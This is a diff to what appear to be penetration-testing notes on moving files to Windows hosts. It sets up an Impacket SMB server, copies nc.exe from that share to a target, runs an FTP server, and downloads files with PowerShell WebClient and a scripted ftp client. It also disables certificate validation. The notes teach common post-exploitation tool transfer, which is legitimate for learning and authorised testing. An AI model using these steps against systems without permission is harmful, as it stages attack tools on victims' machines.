@@ -56,13 +56,13 @@ if the certificate is not trusted. We can bypass that error with the following c
 PS C:\user> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
 ## 3) PowerShell SMB Downloads
-
+- create smbserver
 ```bash
 sudo /usr/share/doc/python3-impacket/examples/smbserver.py share -smb2support ./shareIsCare
 
 sudo /usr/share/doc/python3-impacket/examples/smbserver.py share -smb2support ./shareIsCare -user test -password test
 ```
-
+- copy files using powershell
 ```powershell
 PS C:\user> copy \\192.168.220.133\share\nc.exe
 
@@ -73,4 +73,33 @@ The command completed successfully.
 
 PS C:\user> copy n:\nc.exe
         1 file(s) copied.
+```
+## 4) PowerShell FTP Downloads
+
+```bash
+sudo python3 -m pyftpdlib --port 21
+```
+
+- Download Using PowerShell
+```powershell
+PS C:\user> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+```
+
+- Download using Command File for the FTP Client and Download the Target File
+```powershell
+C:\user> echo open 192.168.49.128 > ftpcommand.txt
+C:\user> echo USER anonymous >> ftpcommand.txt
+C:\user> echo binary >> ftpcommand.txt
+C:\user> echo GET file.txt >> ftpcommand.txt
+C:\user> echo bye >> ftpcommand.txt
+C:\user> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+Log in with USER and PASS first.
+ftp> USER anonymous
+
+ftp> GET file.txt
+ftp> bye
+
+C:\user>more file.txt
+This is a test file
 ```
